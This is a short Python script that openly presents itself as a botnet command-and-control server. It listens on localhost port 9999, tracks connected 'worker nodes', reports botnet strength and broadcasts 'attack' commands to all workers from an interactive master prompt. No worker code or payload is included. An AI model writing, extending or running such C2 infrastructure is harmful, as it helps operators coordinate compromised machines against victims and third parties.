import socket
import threading

workers = []

def handle_worker(conn, addr):
    workers.append(conn)
    print(f"\n[+] Worker Node joined from {addr}. Total Active: {len(workers)}")
    while True:
        try:
            if not conn.recv(1024): break
        except:
            break
    workers.remove(conn)
    print(f"\n[-] Worker {addr} disconnected. Total Active: {len(workers)}")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 9999))
    server.listen(10)
    print("\033[96m[*] Command & Control (C2) Server Online. Listening on port 9999...\033[0m")

    # Background thread to accept incoming workers
    threading.Thread(target=lambda: [
        threading.Thread(target=handle_worker, args=server.accept(), daemon=True).start() 
        for _ in iter(int, 1)
    ], daemon=True).start()

    while True:
        cmd = input("\033[93mC2-MASTER>\033[0m ").strip()
        if cmd == "status":
            print(f"[*] Botnet Strength: {len(workers)} active worker nodes.")
        elif cmd.startswith("attack"):
            print(f"[*] Broadcasting execution order to {len(workers)} nodes...")
            for w in workers:
                try: w.send(cmd.encode())
                except: pass

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\n[-] Shutting down C2.")